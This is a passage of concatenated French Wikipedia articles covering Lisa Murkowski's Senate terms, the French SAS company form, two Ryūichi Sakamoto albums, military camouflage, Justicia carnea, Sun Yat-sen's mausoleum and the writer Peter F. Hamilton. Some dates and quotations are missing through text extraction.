Elle se présente aux élections sénatoriales de 2004 pour conserver son mandat. Elle affronte le démocrate Tony Knowles, ancien gouverneur de l'État. L'élection est considérée comme l'une des plus serrées du pays, notamment en raison des critiques de népotisme à l'égard de Lisa Murkowski, sénatrice grâce à son père. Au soir des élections, elle revendique la victoire, mais son adversaire dit que tous les votes n'ont pas encore été pris en compte. Elle remporte l'élection avec 48,58 % des voix contre 45,55 % pour Tony Knowles, selon résultats officiels après recomptage. L'appui de l'autre sénateur républicain d'Alaska, Ted Stevens, en fin de campagne, aurait été décisif dans sa victoire.
Quand le Sénat devient démocrate en 2007, elle vote à 80 % en accord avec son parti, contre 91 % en 2005-2006. Sous la présidence de Barack Obama, elle s'oppose au plan de relance du gouvernement, à l'« "Obamacare" » et aux nominations de Sonia Sotomayor et Elena Kagan à la Cour suprême des États-Unis.
Troisième mandat.
Lisa Murkowski est candidate à un nouveau mandat pour les élections sénatoriales de 2010. Alors que les sondages lui donnaient une avance confortable, elle perd les primaires républicaines d'environ au mois d'août. C'est le candidat ultra-conservateur Joe Miller, soutenu par l'ancienne gouverneur Sarah Palin et les Tea Party, qui l'emporte. Elle concède sa défaite la semaine suivant les élections. À la mi-septembre, elle annonce sa volonté de se présenter à l'élection sénatoriale en tant que candidate "", c'est-à-dire que son nom doit être inscrit par les électeurs eux-mêmes sur le bulletin de vote. Le , les premiers résultats la voient arriver en tête des élections avec environ 40 % des voix, contre 34 % à Joe Miller et 24 % au démocrate Scott McAdams.
Mais Joe Miller conteste les résultats, posant notamment la question de la nécessité de l'orthographe correcte du nom Murkowski. Après deux semaines de recomptage, sa réélection est confirmée, même en retirant les bulletins jugés litigieux. Lisa Murkowski devient le premier sénateur élu en tant que "" depuis Strom Thurmond en 1954. Joe Miller refuse de concéder sa défaite et dépose plusieurs recours devant les tribunaux. Ce n'est que le que son élection est certifiée par le gouverneur de l'État, Sean Parnell, avec d'avance sur Joe Miller.
Pendant les élections, Lisa Murkowski avait fait appel aux républicains modérés, aux démocrates les plus conservateurs et aux indépendants. Elle a aussi bénéficié du soutien crucial des Amérindiens de l'Alaska qui représentent 15 % de la population de l'État. Après sa victoire, elle se recentre et se montre davantage indépendante du Parti républicain dans ses votes. Certains groupes la qualifiant comme la républicaine la moins conservatrice, devant même les sénatrices modérées du Maine Susan Collins et Olympia Snowe. 
Elle devient présidente du Comité sur l'énergie et les ressources naturelles du Sénat en janvier 2015. Si elle ne nie pas l'existence du réchauffement climatique, elle s'oppose généralement aux mesures visant à y faire face, notamment en défendant les intérêts des industries pétrolières et gazières contre les règlementations de l'Agence de protection de l’environnement. 
Quatrième mandat.
Le , après avoir obtenu l'investiture républicaine, elle affronte une nouvelle fois Joe Miller, qui se présente comme libertarien, ainsi que quatre autres candidats. Elle est réélue avec 44,36 % des voix, devant Miller à 29,16 %. Comme son collègue Dan Sullivan, elle refuse d'appuyer la candidature de Donald Trump à la présidence, lui reprochant notamment son attitude indigne envers les femmes. 
En , elle est un des trois sénateurs républicains à voter contre le projet de loi modifiant l"'Obamacare" proposé par la majorité républicaine au Sénat parce qu'elle juge que les modifications proposées pourraient porter préjudice à son électorat en privant de nombreuses personnes, dont les Amérindiens, d'une couverture médicale.
Le , Murkowski est la seule républicaine à s'abstenir lors de la confirmation de Brett Kavanaugh, qui est accusé d'agression sexuelle, à la Cour suprême. Opposée à la nomination, elle choisit cependant de s'abstenir pour que son collègue Steve Daines puisse assister au mariage de sa fille. Deux ans plus tard, elle déclare qu'elle ne votera pas la confirmation d'Amy Coney Barrett, nommée par Donald Trump à la Cour suprême, et dont l'audition par la commission sur la Justice du Sénat débute le . Elle justifie sa décision par la proximité de l'élection présidentielle. Si elle vote effectivement contre le lancement de la procédure de confirmation d'Amy Coney Barrett, elle vote finalement en faveur de sa nomination à la Cour suprême, citant les qualifications de la juge.
Le , elle est la première sénatrice républicaine à appeler publiquement à la démission de Donald Trump à la suite de l'assaut du Capitole par ses partisans : .
Lisa Murkowski est un des sept sénateurs républicains qui votent avec les 50 sénateurs démocrates pour la condamnation de Donald Trump lors du second procès en destitution de ce dernier devant le Sénat, qui se termine par l'acquittement de l'ex-président, prononcé le par le Sénat, la majorité des deux tiers n'ayant pas été atteinte. Les sept sénateurs républicains qui votent pour la condamnation sont : Susan Collins (Maine), Lisa Murkowski (Alaska), Mitt Romney (Utah), Ben Sasse (Nebraska), Pat Toomey (Pennsylvanie), Richard Burr (Caroline du Nord) et Bill Cassidy (Louisiane). Après l'acquittement, la présidente de la Chambre des représentants des États-Unis Nancy Pelosi déclare : .
Cinquième mandat.
En juin 2021, Donald Trump apporte son soutien à la républicaine Kelly Tshibaka en vue des élections sénatoriales de 2022 pour lesquelles Murkowski officialise sa candidature en novembre 2021. En novembre 2022, elle est réélue contre sa rivale républicaine dans la première élection sénatoriale tenue en Alaska sous le système du vote à second tour instantané.
Lors des primaires républicaines pour l'élection présidentielle de 2024, elle apporte son soutien à Nikki Haley. Après l'abandon de cette dernière à la suite du Super Tuesday, elle réaffirme qu'elle ne votera pas pour Donald Trump lors de l'élection générale.

</doc>
<doc id="248710" url="https://fr.wikipedia.org/wiki?curid=248710" title="Société par actions simplifiée">
Société par actions simplifiée

Une société par actions simplifiée (SAS) est une entreprise définie par les articles L.227-1 à L.227-20 et L.244-1 à L.244-4 du code de commerce français. Elle constitue une alternative à la société anonyme assortie d'un pacte d'actionnaires de droit.
Description.
La SAS est à la fois société de capitaux, ce qui la rapproche de la société anonyme, et société de personnes, ce qui en fait une société mixte. Elle se distingue surtout de la SA par la grande liberté qui est laissée aux associés. Cet allègement des contraintes, et notamment le fait que le fonctionnement interne de la SAS est essentiellement défini par les statuts, c’est-à-dire par la volonté de ses associés, et non pas par la loi, est en effet à l'origine de la création de la forme SAS et fait de celle-ci un instrument de gestion privilégié par les grands groupes, notamment multinationaux, ainsi que par les petites ou moyennes entreprises et les sociétés mères d'achat à effet de levier (LBO). La SAS est aussi très appréciée des start-ups (jeunes pousses)
La principale caractéristique de la SAS est qu'elle permet de dissocier le capital du pouvoir, tout en préservant certaines caractéristiques de la SA : en résumé, un associé peut disposer de prérogatives indépendantes de sa part de capital.
Adoption du statut.
La SAS est devenue la forme sociale privilégiée des PME et des holdings financiers (particulièrement dans les LBO).
La SAS, créée en 1994 (loi du ), a longtemps été réservée aux coentreprises ; elles ne pouvaient alors être constituées qu'entre des sociétés d'un capital d'au moins . En 1999, la SAS a été ouverte à toutes personnes physiques ou morales et a immédiatement connu un formidable essor, pour deux raisons principales qui sont le statut social du chef d'entreprise et la liberté contractuelle.
Liberté contractuelle.
Sur le plan de la liberté contractuelle, la SAS est devenue le vecteur privilégié des organisations de type capitalistique / managériale et ce pour plusieurs raisons dont les principales sont les suivantes :
Régime fiscal.
La SAS est en principe soumise à l'impôt sur les sociétés (IS).
La SAS peut toutefois opter pour l'impôt sur le revenu (IR) à la condition toutefois que le capital soit détenu à plus de 50 % par des personnes physiques et que le dirigeant et sa famille détiennent au moins 34 % du capital ; cette option est réservée aux sociétés créées depuis moins de cinq ans, exerçant une activité commerciale, artisanale, agricole ou libérale, et en dessous du triple seuil de 50 salariés, 10 millions d'euros de chiffre d'affaires et 10 millions d'euros de total de bilan ; cette option n'est valable que durant 5 exercices.
Si la société est à l'IR, seuls les associés sont imposés et non la société elle-même (c'est ce que l'on appelle la transparence fiscale) : chaque actionnaire doit déclarer une fraction du bénéfice proportionnelle à sa participation au capital dans sa déclaration des revenus ; il en est ainsi même si la société ne procède pas à la distribution de ce bénéfice : par contre, il n'y aura pas lieu à nouvelle taxation le jour où la société procèdera à une distribution.
La SAS est soumise à la TVA dès lors qu'elle a une véritable activité économique: cela exclut les holdings exclusivement financières.
Sécurité sociale.
Le dirigeant d'une SAS (président ou directeur général) est assujetti au régime de sécurité sociale des travailleurs salariés s'il est rémunéré au titre de ses fonctions ; il n'est pas assujetti et n'est pas soumis à cotisations si ses fonctions de dirigeant ne sont pas rémunérées.
Le dirigeant rémunéré ne bénéficie que de la sécurité sociale des salariés : il n'est pas un salarié au regard du droit du travail et ne peut donc bénéficier ni des dispositions des conventions collectives ni de droits au chômage.
Sur le plan du statut social, la SAS est un substitut à la société anonyme (SA) dans les PME. Les PME adoptaient auparavant la forme de SA afin de permettre aux dirigeants majoritaires dans le capital de bénéficier du régime de protection sociale des salariés. Deux types de régimes sociaux existent en France : le régime « salarié » et le régime « travailleurs non salariés » (TNS).
Schématiquement, dans le régime salarié (régime « général »), les cotisations sont versées à des organismes (para)publics de répartition (maladie et retraite) et ouvrent droit à des prestations sociales assurées par ces régimes. Le régime TNS, à l'inverse, consiste à cotiser à des organismes privés, sous la tutelle de l'État, fonctionnant (pour la retraite) sur le principe de la capitalisation ou (pour la maladie) sur le principe de l'assurance.
Le dirigeant, majoritaire en capital, d'une société est affilié à l'un ou l'autre des régimes selon la forme de la société :
Jusqu'à la loi Madelin du , le régime TNS offrait, à coût identique, une protection sociale significativement moindre, tant en termes de maladie que de retraite. Depuis les réformes « Madelin », la donne s'est progressivement inversée et désormais le régime TNS est généralement moins coûteux à protection égale (sauf maladie chronique non couverte par les assurances « privées » du régime TNS).
Ceci explique que de nombreuses PME avaient auparavant la forme de SA : le dirigeant (détenant très souvent 99,99 % du capital, le solde étant fictivement réparti entre son conjoint, ses enfants et amis) souhaitait simplement bénéficier du régime général.
La SAS a changé la donne dans la mesure où les contraintes formelles liées à la SA (au moins deux actionnaires depuis (auparavant sept), existence d'un conseil d'administration…) disparaissaient tout en maintenant le même régime de protection sociale. De nombreuses PME se sont donc immédiatement transformées en SAS. La SA, qui représentait jusqu'en 2000 environ 40 % des PME ne représente plus aujourd'hui que 10 %, par cette simple considération.

</doc>
<doc id="248711" url="https://fr.wikipedia.org/wiki?curid=248711" title="Envie (homonymie)">
Envie (homonymie)

Envie peut désigner :

</doc>
<doc id="248717" url="https://fr.wikipedia.org/wiki?curid=248717" title="BTTB">
BTTB

 (") est un album de musique réalisé par le pianiste et compositeur japonais Ryūichi Sakamoto, sorti en 1999.
Présentation.
Le titre de l'album est un acronyme pour ".
Deux versions distinctes de l'album ont été pressées, pour les marchés japonais et internationaux. La version internationale s'ouvre avec les trois morceaux du maxi-single ", sorti en , au Japon, en tant qu'outil promotionnel, remplaçant 3 des pistes de l'édition originale de l'album.
Le maxi-single a culminé à la du classement des singles japonais.
Liste des titres.
Conditionné dans un étui rigide, cette box set comprend un CD des 14 premiers titres de l'édition originale japonaise (soit 53:40) ainsi qu'une disquette 3½ pouces (en ") contenant des fichiers MIDI pour 8 des pistes de l'album, le tout accompagné de 32 feuilles de musique pour ces mêmes pistes.

</doc>
<doc id="248727" url="https://fr.wikipedia.org/wiki?curid=248727" title="Moto.tronic">
Moto.tronic

Moto.tronic est un album de musique de Ryūichi Sakamoto, sorti en 2003. Il s'agit d'une compilation de titres issus d'albums sortis précédemment : "Neo Geo", "Discord", "Cinemage", "BTTB" et "Casa" et "". Il combine des morceaux d'inspiration classique, de bossa nova avec quelques incursions electro-pop. Cependant, "AllMusic" estime que cette diversité de styles peut être déroutante pour le néophyte.

</doc>
<doc id="248739" url="https://fr.wikipedia.org/wiki?curid=248739" title="Oncolite">
Oncolite



</doc>
<doc id="248740" url="https://fr.wikipedia.org/wiki?curid=248740" title="Camouflage (militaire)">
Camouflage (militaire)

Le camouflage désigne tout moyen ou dispositif tendant à rendre moins visible ou à donner une apparence trompeuse à un objet ou à un être vivant.
Le mot camouflage a été créé en 1914 dans le jargon militaire français à partir d'un verbe italien, « "camuffare" », ayant le même sens. indique que le mot vient du vieux français « camouflet », qui désigne un nuage de fumée, de poussières.
Historiquement, les teintes utilisées afin d'obtenir un effet camouflant sont différentes nuances de vert, de kaki, de brun ou de beige. Parfois, le gris ou le noir sont aussi utilisés, mais en tout état de cause les couleurs sont mates. Mais, depuis l'invention de l'imagerie par satellite, ces notions ont évolué.
Un système camouflant est réalisé à partir de différents matériaux et techniques, tels que des peintures, branchages, des filets colorés en textile ou des tissus imprimés.
Histoire du camouflage militaire.
Dans le domaine militaire, le camouflage est largement utilisé pour dissimuler à la vue de l'ennemi du matériel, des véhicules, des navires ou du personnel militaire.
Son utilisation dans l'uniforme des fantassins est un signe caractéristique du passage à l'ère de la guerre moderne, lors de la Première Guerre mondiale. En effet, dans les guerres des époques précédentes, les tenues voyantes permettaient de mieux distinguer les différentes unités sur un champ de bataille bien délimité, où la puissance et la portée des armes à distance étaient faibles et où la majeure partie des combats se faisait au contact. Avec l'augmentation de la portée et de la cadence de tir des armes à feu, la dissimulation devenait une nécessité pour protéger le soldat.
Première Guerre mondiale.
Aux premières heures du conflit seules les tenues vestimentaires des armées britanniques, allemandes et des États-Unis adoptaient des couleurs dans différents tons de kaki qui rendaient les soldats moins visibles de loin. Bien que l'expérience britannique durant la guerre des Boers ait mis en évidence les bienfaits des toutes premières "ghillie suit" pour les francs-tireurs leur utilisation tactique ne fut pas généralisée durant ce conflit.
Les premières utilisations du camouflage servirent à dissimuler les navires (principalement dans la Royal Navy), les avions (certains avions allemands Albatros, Fokker, Aeg et Pfalt en particulier utilisaient un décor fait de losanges de différentes couleurs afin de dissimuler les avions parqués au sol à la vue des appareils ennemis), les chars d'assaut, les postes d'observation et les pièces d'artillerie.
Le camouflage individuel apparaît sur le casque des soldats allemands lors de l'adoption du nouveau casque, le Stahlhelm, introduit en 1916. Les troupes de choc peignaient leurs casques d'acier de formes géométriques et de couleurs claires, rappelant les formes appliquées sur les avions, afin de dissimuler leurs silhouettes lorsqu'ils regardaient au-dessus du parapet.
Du côté français, on attribue aux travaux de Louis Guingot, Eugène Ronsin, Eugène Corbin et de Lucien-Victor Guirand de Scévola la paternité du développement de cette technique dans les armées. Ainsi, Lucien-Victor Guirand de Scévola met en œuvre, dès 1914, des toiles bariolées dont les teintes se fondent avec celles de la nature environnante pour dissimuler une pièce d’artillerie. Le résultat est immédiat : les Allemands peinent à la repérer. L'armée française utilisa ensuite les compétences de différents artistes : Fernand Léger, Auguste Herbin, Jean-Louis Forain, Georges Paul Leroux, Loÿs Prat, André Mare, Georges Mouveau, Pierre Patout et Louis Abel-Truchet. Elle les réunit en février 1915 au sein de la Section de camouflage (créée en , sous le commandement de Lucien-Victor Guirand de Scévola promu lieutenant à cette occasion ; la section adopte au col des tenues un insigne en forme de caméléon, par référence au mimétisme de cet animal, dont un vivait en liberté dans l'atelier de Louis Guingot. La tenue du sous-officier Louis Guingot qui servit de test est exposée au musée de la grande guerre de Péronne (Somme). Le Guinness World Records a reconnu la date du comme date de première utilisation du camouflage moderne. Les camoufleurs ont la charge de dissimuler aux regards de l'ennemi les pièces d'artillerie, mais également les voies de communication comme les voies ferrées. Ils parviennent même, en cassant les lignes réelles des engins, à dissimuler des trains en marche . Des arbres de camouflages sont également créés pour dissimuler les postes d'observation.
En 1918, la section désormais organisée de manière industrielle comptait et employait (principalement des travailleurs Annamites) et dans la fabrique de camouflage supervisée par le capitaine Lucien-Victor Guirand de Scévola.
C'est durant la grande guerre que les armées étrangères utilisèrent le mot français "camouflage" qui n'existait pas dans leurs langues.
Seconde Guerre mondiale.
Le camouflage individuel par les vêtements fut très utilisé et amélioré durant le second conflit mondial, lors duquel on l'employa sur les tenues et vêtements portés par les troupes de certains pays, les avions, les chars, ainsi que les navires de guerre.
Chaque pays belligérant adopta des types de camouflages permettant de différencier les troupes amies des troupes ennemies.
Chaque saison de l'année imposait d'utiliser un camouflage adapté au milieu. Pour l'hiver par exemple, des tenues blanches tachetées ont fait leur apparition. Pour les combats urbains, comme pendant la bataille de Stalingrad, on utilisa des tenues qui faisaient apparaître un décor de briques, tenues qui furent utilisées principalement par l'armée soviétique.
Des techniques de trompe-l'œil furent utilisées sur le mur de l'Atlantique, des peintres dessinèrent de fausses fenêtres et des façades pour dissimuler des blockhaus et les faire passer pour des immeubles d'habitation.
Il a été estimé à l'époque qu'un camouflage améliorait de 15 % les chances de survie d'un fantassin. Ainsi, Soviétiques et forces de l'Axe, dont Allemands et Japonais réintroduiront l'usage des premières ghillie suits ou de simples combinaisons camouflées, quand il ne s'agissait pas de carapaces de végétaux, pour leurs snipers.
De nos jours.
Les moyens de détections modernes (vision infrarouge, radar, détection acoustique) ont rendu le camouflage moins opérant mais son utilisation reste préconisée. Les armées et industriels développent en réaction à ces progrès de nouveaux moyens de camouflage comme de nouveaux types de filet, qui en plus d'être bariolés diminuent le rayonnement thermique de l'objet couvert (le rendant ainsi moins visible aux moyens de vision en infrarouge).
Les grandes familles de camouflage.
Camouflage à forme brisée.
Héritier du camouflage des casques allemands et des tenues des camoufleurs français, il est composé de deux, trois ou quatre couleurs. Ce sont de grandes taches ou coups de pinceaux qui sont appliqués sur un tissu déjà coloré.
Ce motif a pour avantage de casser les formes. Très efficace de loin ou contre les reconnaissances aériennes, il a pour défaut d'augmenter le contraste et d'être inefficace à courte distance.
"Flecktarn" et camouflage numérique.
"Flecktarn".
En 1937, les Waffen-SS décidèrent, sous l'impulsion d'Heinrich Himmler, de renouer avec le culte du « chasseur/soldat » et de développer un camouflage qui les rapprocherait de la forêt en les distinguant de l'armée régulière. C'est ainsi que "Brandt and Schick's" développe en décembre 1937 un motif qui rompt avec la technique de brisure. Ce motif est appelé « motif d'arbre », il est composé de petites taches et de formes rappelant les feuilles. Testé sur le champ de bataille, il fut un succès, réduisant de 15 % les engagements adverses. Il fut amélioré, pour obtenir en 1944 le camouflage de type "Erbsenmuster" ou « petit pois », seulement composé d'un assemblage quinticolore de petites taches rappelant le pelage des félins.
Les Américains s'inspirèrent de ce type de camouflage mais ne l'utilisèrent principalement que sur le front Pacifique même si certaines rares unités en furent dotées en juin 1944 (dont des unités pathfinders parachutistes aux treillis zébrés noir).
Durant la guerre froide, l'armée de l'Allemagne de l'Ouest continua d'exploiter ce type de camouflage « petit pois » ou « léopard ».
C'est en 1990 que l'armée allemande reconstituée utilise le camouflage de type "flecktarn", décliné également en version désert "Wüstentarn".
Camouflage numérique.
Ce type de camouflage à pois intéressa les forces armées des États-Unis et de nombreux tests durant les années 1970 s'orientèrent vers des versions à forme carrée ou rectangulaire.
C'est seulement dans les années 2000 que l'armée canadienne mit au point le premier « camouflage numérique » ou « camouflage pixélisé », le DCamC (Dessin de camouflage canadien), assisté par informatique, ce camouflage utilise des synthèses d'images satellite ; il reprend l'idée des points des Waffen-SS. Il est officiellement en service en 2001 et est décliné en versions aride « DCamC régions arides (RA) » et arctique.
L'armée américaine n'est pas en reste et chaque corps développe son propre camouflage numérique :
Camouflage commerciaux.
MultiCam.
Le MultiCam est un camouflage hexachromique. Il fut en concurrence avec le camouflage UCP ("Universal Camouflage Pattern") pour remplacer les stocks de l'armée américaine.
Développé par la société Crye Precision, il a la particularité d'être tout terrain. Utilisé au départ par certaines forces spéciales de l'United States Special Operations Command, il est très prisé par les employés des sociétés militaires privées, en particulier la fameuse Blackwater Worldwide, avec laquelle Crye Precision a développé une ligne d'équipement.
Il reprend et fusionne l'idée du camouflage brisé et du camouflage à pois et est en dotation depuis septembre 2009 sur le théâtre extérieur de la Guerre d'Afghanistan pour des forces américaines. En février 2010, il est annoncé qu'il sera adopté par la totalité des forces américaines déployées dans ce pays.
"Multi-Terrain Pattern".
La société Crye Precision a développé avec l'armée britannique un nouveau camouflage, le MTP très proche du MultiCam.
Mirage.
Le camouflage Mirage de la société Bulldog Equipment est à l'étude par l'armée américaine. C'est un camouflage numérique comportant six à sept couleurs.
Principe du FOMECBLOT.
FFOMECBLOT est l'acronyme de « Fond, Forme, Ombre, Mouvement, Éclat, Couleur, Bruit, Lumière, Odeur et Traces ». Il s'agit d'un moyen mnémotechnique des militaires francophones pour garder à l'esprit les fondamentaux du camouflage. Dans la FETTA (Formation Élémentaire Toutes Armes) des années 1980, le FOMBECTO signifie « Forme, Ombre, Mouvement, Bruit, Éclat, Couleur, Traces, Odeur ».
Une variante est FORMATT, pour « Forme, Ombre, Reflet, Mouvement, Arrière-plan, Tonalité, Traces ».
En Belgique, le terme mnémotechnique FORMATOSE est utilisé. La déclinaison de ce mot correspond à « Forme, Ombre, Reflet, Mouvement, Arrière plan, Tonalité-ton, Odeur, Son, Électro-magnétisme ».
Il convient en effet de casser la forme pour la rendre moins discernable, de ne pas oublier que le soleil tourne et qu'un abri camouflé le matin peut se retrouver exposé l'après-midi, de prendre garde aux objets métalliques, aux verres de montres et autres optiques et de se déplacer lentement. Il faut également veiller à toujours coller à son environnement s'il y a déplacement (d'une zone boisée vers des champs par exemple), communiquer par signes et enfin effacer toute trace de son passage (empreintes, déchets, etc.).
Concernant les odeurs, les dentifrices ainsi que les savons parfumés ou odorants sont à proscrire, notamment en forêt ou dans la jungle.
Camouflage thermo-optique.
La lumière réfléchie par un corps ne se limite pas au visible. Les camouflages sont composés de motifs appliqués principalement sur les textiles, qui dissimulent la présence mais ne la masquent pas. Le camouflage thermo-optique permettra de masquer complètement le corps de la vision de l'ennemi.
Camouflage optique.
Des laboratoires de l'armée américaine développent des camouflages rendant le porteur invisible. Ceux-ci permettent la réflexion de la lumière d'un côté du corps à l'autre. Ainsi, un homme situé devant un mur noir sera aperçu avec une teinte noire. Des capteurs (placés sur le dos) font ressortir la même teinte (sur le ventre). Ce type de camouflage est en phase de développement. Il est aussi développé pour les blindés et autres véhicules lourds. Son efficacité ne lui permet pas encore d'être très fiable.
Le camouflage optique est un genre de camouflage actif. Si on projette une image sur un objet masqué, celui-ci donnera l'illusion d'être transparent. Pour obtenir ce camouflage optique, les chercheurs font appel à un procédé baptisé « X'tal vision ».
Camouflage textural.
Le caméléon et les céphalopodes (pieuvre notamment) sont une source majeure d’inspiration pour la biomimétique : non seulement ils sont dotés d’une excellente vue et ils peuvent changer de couleur pour se fondre dans leur environnement ou exprimer des « sentiments », mais ils peuvent aussi (en quelques millisecondes) modifier la texture de leur peau et imiter la granularité de leur environnement. La robotique molle pourrait bientôt intégrer de telles capacités comme le montrent Pikul et al. en oct 2017 dans la revue Science : ils ont obtenu des textures au relief modifiable sur une « peau synthétique » à base de silicone. Les possibilités de transformation bi- ou tri-dimensionnelles programmables de surfaces élastiques et colorées sont encore rudimentaires, mais, par exemple associées à un réseau de neurones artificiels, elles laissent entrevoir un nouveau champ du possible. Dans le cas présent des membranes élastomères sont enrobées de mailles textiles inextensibles et peuvent être plus ou moins « gonflées » pour prendre des formes pré-programmées.
Camouflage aux infrarouges.
Durant la Seconde Guerre mondiale, les armées ont déjà été confrontées au problème du camouflage dans le spectre électromagnétique hors de la vision humaine (infrarouge et ultraviolet).
La photographie infrarouge fut développée par Kodak en 1937. Les nazis y trouvèrent tout de suite une application militaire, pour la détection nocturne des troupes adverses. Le vert naturel de la flore réfléchit cette partie du spectre tandis que le corps humain, qui l'absorbe, apparaît plus sombre. C'est ainsi que l'industriel I.G. Farben développe un agent chimique à haut pouvoir réfléchissant, appelé "Hydron Olive GX". Il contient du sulfure et est incorporé dans les parties vertes des camouflages nazis.
De leur côté les Américains ne maîtrisèrent pas pleinement les techniques de vision infrarouge. C'est seulement en 1965, durant la guerre du Vietnam, que l'armée US ajouta des colorants réfléchissants aux tenues militaires.
En 1981, le camouflage M81 "Woodland" a intégré pleinement des agents réfléchissants. Mais durant ce début des Années 1980, l'armée US se voit confier de nouvelles missions dans le golfe Persique. Elle s'aperçoit que le M81 Woodland devient un handicap pour les zones arides. La solution est simple : ne pas ajouter d'agent réfléchissant dans les camouflages arides et arctiques (tel que dans le "Chocolate chips").
En France, la perception des premiers uniformes traités pour limiter la détection infrarouge par l’imbibition au noir de carbone a lieu lors de l'opération Daguet en 1990.
Depuis peu, la France a décidé de changer le camouflage de son armée que ce soit sur ces tenues ou sur ces véhicules. C'est le camouflage brun terre de France qui dissimulera entièrement les soldats et véhicules français d'ici 2021.
Camouflage thermique.
Le corps humain (dans une moindre mesure que les véhicules) dégage un rayonnement de chaleur, lié à sa température, visible par thermographie. L'objet chaud apparaît de façon claire, ce qui le détache du fond plus sombre.
Une méthode pour réduire cette signature thermique est de rendre le soldat plus proche de la température de l'environnement en augmentant la surface d'échange. L'utilisation d'un poncho permet la diffusion de la chaleur et casse la forme humaine. Des techniques plus efficaces sont aussi employées, telle que la tenue "Ghillie suit" qui, par son nombre de fibres, agit comme un radiateur. Une autre technique est de développer des textiles ou des peintures à faible émission, incorporant le plus souvent des particules métalliques.
Camouflage "Dazzle" (camouflage naval).
Durant les deux Guerres mondiales, les bateaux de guerre, pour se protéger des sous-marins comme les U-Boot, adoptèrent un camouflage qui permettait de brouiller la vision de leurs infrastructures.
Issu du travail graphique de l'artiste britannique Norman Wilkinson, le camouflage Dazzle se constituait de formes géométriques de couleurs grises ou noires ; parfois on redessinait les contours d'un autre navire sur la coque afin de mieux tromper l'observateur ennemi. Ainsi, par un périscope ou de loin à la jumelle, il était difficile de déterminer de quel type de vaisseau il s'agissait.
Au , ce type de camouflage est toujours utilisé de manière sporadique.

</doc>
<doc id="248745" url="https://fr.wikipedia.org/wiki?curid=248745" title="Justicia carnea">
Justicia carnea

Justicia carnea est une espèce de plantes à fleurs de la famille des Acanthacées. C'est un arbuste originaire d'Amérique du Sud.
Description.
Il peut atteindre 1,50 m de haut. Les feuilles mesurent de 15 à 20 cm de long, garnies de poils duveteux. Les fleurs sont disposées en capitules terminaux denses de 10 à 20 cm de long. Les fruits sont des capsules qui contiennent 4 graines, parfois moins.

</doc>
<doc id="248749" url="https://fr.wikipedia.org/wiki?curid=248749" title="SAS (société)">
SAS (société)



</doc>
<doc id="248755" url="https://fr.wikipedia.org/wiki?curid=248755" title="Mausolée de Sun Yat-sen">
Mausolée de Sun Yat-sen

Le mausolée de Sun Yat-sen (), est la sépulture sur laquelle se trouve la dépouille de Sun Yat-sen, le premier président de la République de Chine, sur la montagne Pourpre, une colline boisée de l'agglomération de Nankin.
Il a été classé en 1961 dans la liste des Sites historiques et culturels majeurs protégés au niveau national.
Le lieu, qui reprend largement les symboles de l'architecture chinoise classique, est entouré d'une vaste enceinte. Une longue allée rectiligne, suivie d'un escalier de 50 mètres de large comptant 392 marches mène au monument funéraire lui-même. À l'intérieur de l'enceinte se trouve également un musée historique, ainsi que des boutiques de souvenirs. Le musée comprend une salle de spectacle où se jouent régulièrement des spectacles et des représentations d'opéra cantonais.
À proximité, sur la même colline, se trouvent également l'observatoire de la Montagne Pourpre, la pagode du temple Linggu, le Tombeau Xiaoling, des parcs de loisirs.

</doc>
<doc id="248765" url="https://fr.wikipedia.org/wiki?curid=248765" title="Peter F. Hamilton">
Peter F. Hamilton

Peter F. Hamilton, né le dans le comté de Rutland du Royaume-Uni, est un écrivain de science-fiction britannique, surtout connu pour ses œuvres de "space opera".
"The Suspect Genome", inédit en France, a remporté le prix British Science Fiction de la meilleure fiction courte 2000. "Dragon déchu" a été nommé pour le prix Arthur-C.-Clarke 2002.
En 2008, l'éditeur britannique Pan Macmillan annonce que ses dix premiers romans se sont vendus à près de deux millions d'exemplaires dans le monde.
Biographie.
Peter F. Hamilton suit des études scientifiques sans aller à l’Université jusqu'au bout, car il travaille tôt en usine et, durant les années 1980, s'occupe à toute heure de sa mère gravement malade. Depuis son adolescence, pour s'occuper, il lit beaucoup de livres de science-fiction, comme ceux d’Arthur C. Clarke, Robert A. Heinlein, Isaac Asimov, Brian Aldiss, Larry Niven. Il lit également des magazines comme "New Scientist sur les développements de la science et de la technologie" — les presses de science-fiction et de fantastique à cette époque-là étaient très courantes outre-Manche — et, une idée en tête, s'achète une machine à écrire.
Vie privée.
En 2008, Peter F. Hamilton vit toujours près de Rutland Water auprès de sa femme, Kate, de sa fille, Sophie, et de son fils, Felix.
Carrière d'écrivain.
Peter F. Hamilton commence à écrire en 1987 et vend sa première nouvelle ' qui, par la suite, paraît dans "Fear", un magazine consacré à l’horreur ouverte à la science-fiction et à la fantasy, en . Il en écrit ensuite d'autres pour de petits journaux, pour le magazine "Interzone" et pour l’anthologie "In Dreams and New Worlds". Après ses nombreuses nouvelles, l'éditeur de lui passe un coup de fil, lui demandant s'il est en train de travailler sur un roman. C'est ainsi que son premier roman ' ("Mindstar", titre français paru en 2010) paraît en 1993. Il est suivi par ' en 1994 ("Quantum", titre français paru en 2010) puis ' en 1995 ("Nano", titre français paru en 2011) qui font partie de la première trilogie "The Greg Mandel Books" ("Greg Mandel" en France) qui met en vedette le détective psychique dans un avenir proche devant le réchauffement de la planète et le gouvernement communiste. Le petit public anglophone commence très vite à s'y intéresser.
En , Macmillan Publishers publie "The Reality Dysfunction", connu sous le titre français "Rupture dans le réel", premier tome de la trilogie "The Night's Dawn Trilogy" ("L'Aube de la nuit"), sur l'univers space opera de la Confédération reflétant son admiration pour le "Cycle du Fulgur" d'Edward Elmer Smith.
Lors de l'interview pour le magazine "Locus" en 1998, Peter F. Hamilton avait déclaré son intention d'écrire autre chose plutôt que de revenir à son personnage Greg Mandel : on découvre pourtant dans le magazine "Interzone", en 2000, une nouvelle "The Suspect Genome" qui fait revenir ce héros et, comme l'explique l'auteur dans le magazine français "Galaxies", "existait déjà sous forme de synopsis" [qu']"il lui a fallu un long moment avant de pouvoir écrire". Cette nouvelle remporte d'ailleurs le prix British Science Fiction de la meilleure fiction courte dans l'année suivante.
Succès en France.
"L'Aube de la nuit".
La France découvre le nom de l'auteur grâce à sa série en six tomes "L'Aube de la nuit" en chez l'éditeur Robert Laffont qui comprend plus de trois mille pages. Cette série a pour trame un univers répandu d'une richesse des mondes et des colonies orbitales artificielles. L'intrigue se concentre sur le retour des morts depuis l'au-delà, ceux-ci prenant possession du corps des êtres humains.
"Dragon déchu".
